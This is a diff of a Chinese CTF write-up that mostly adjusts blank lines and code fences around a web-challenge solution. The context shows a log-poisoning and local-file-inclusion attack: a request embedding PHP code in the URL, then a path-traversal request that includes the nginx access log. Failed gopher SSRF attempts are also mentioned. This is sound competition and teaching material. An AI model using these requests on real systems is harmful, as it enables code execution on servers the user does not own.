@@ -244,7 +244,7 @@ pad之后得到的字符串
 	
 >>> flag
 'flag{116107e92518781a2b64ec2072d3f73e}'
-```
+
 
 
 ## 杂项
@@ -623,6 +623,7 @@ CREATE TABLE `admin` (
     <img src="https://delcoding.github.io/images/posts/redhat/23.png" height="40%" />  
 </div>
 &emsp;&emsp;这里自己跑偏了一晚上，把考点放在了`gopher协议`的攻击利用上了。试过`gopher + fastcgi`生成shell和基于`ssrf`的`gopher + mysql`攻击利用，但都没有结果，但`gopher`确实是可用的。由于实验的`vps`已经被我删掉了，所以这里就单mark一下。
+
 ```
 参考链接：
 http://drops.xmd5.com/static/drops/tips-16590.html
@@ -643,13 +644,17 @@ http://www.freebuf.com/articles/web/159342.html
 &emsp;&emsp;可以看到，这样就不能识别为`<?php xxx ?>`了。
 
 &emsp;&emsp;正确的做法是在`send.php`里请求：
+
 ```
 http://bb37664e6549424c88750e9f2dd7c0de62213b7e29f343be.game.ichunqiu.com/<?php phpinfo(); ?>/
 ```
+
 &emsp;&emsp;这样会在日志文件中（`/var/log/nginx/access.log`）里产生日志，然后把他包含进来，请求：
+
 ```
 http://bb37664e6549424c88750e9f2dd7c0de62213b7e29f343be.game.ichunqiu.com/index.php?page=../../../var/log/nginx/access.log
 ```
+
 <div align="center">
     <img src="https://delcoding.github.io/images/posts/redhat/24.png" height="40%" />  
 </div>
